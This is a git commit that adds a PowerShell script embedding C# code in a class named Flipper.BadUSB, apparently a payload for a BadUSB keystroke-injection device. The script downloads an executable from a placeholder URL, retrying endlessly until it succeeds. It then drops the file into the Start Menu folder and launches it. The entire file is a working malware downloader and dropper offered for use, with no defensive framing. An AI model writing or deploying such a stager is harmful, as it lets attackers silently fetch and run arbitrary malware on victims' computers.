97942582d6cb4192b3c03d14d2b5bade29a586c7
h-RAT <108246422+h-RAT@users.noreply.github.com>
2022-07-28 01:21:59 +0200

    Create command.ps1

---
+++ command.ps1
@@ -0,0 +1,70 @@
+$code = @"
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Threading;
+
+namespace Flipper
+{
+    public class BadUSB
+    {
+        public void Run()
+        {
+            Thread.Sleep(2500);
+            byte[] Payload = DownloadPayload("http://YOUR_FILE_URL.exe");
+			
+            if (InstallPayload(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\YOUR_FILE_NAME.exe", Payload))
+            {
+            }
+        }
+		
+        public byte[] DownloadPayload(string url)
+        {
+        re:
+            try
+            {
+                using (WebClient wc = new WebClient())
+                {
+                    return wc.DownloadData(url);
+                }
+            }
+            catch
+            {
+                Thread.Sleep(5000);
+                goto re;
+            }
+        }
+		
+        public bool InstallPayload(string dropPath, byte[] payloadBuffer)
+        {
+            if (!Process.GetCurrentProcess().MainModule.FileName.Equals(dropPath, StringComparison.CurrentCultureIgnoreCase))
+            {
+                FileStream FS = null;
+                try
+                {
+                    if (!File.Exists(dropPath))
+                        FS = new FileStream(dropPath, FileMode.CreateNew);
+                    else
+                        FS = new FileStream(dropPath, FileMode.Create);
+                    FS.Write(payloadBuffer, 0, payloadBuffer.Length);
+                    FS.Dispose();
+                    Process.Start(dropPath);
+                    return true;
+                }
+                catch
+                {
+                    return false;
+                }
+            }
+            return false;
+        }
+		
+    }
+}
+
+"@
+
+Add-Type -TypeDefinition $code;
+$instance = New-Object Flipper.BadUSB;
+$instance.Run();
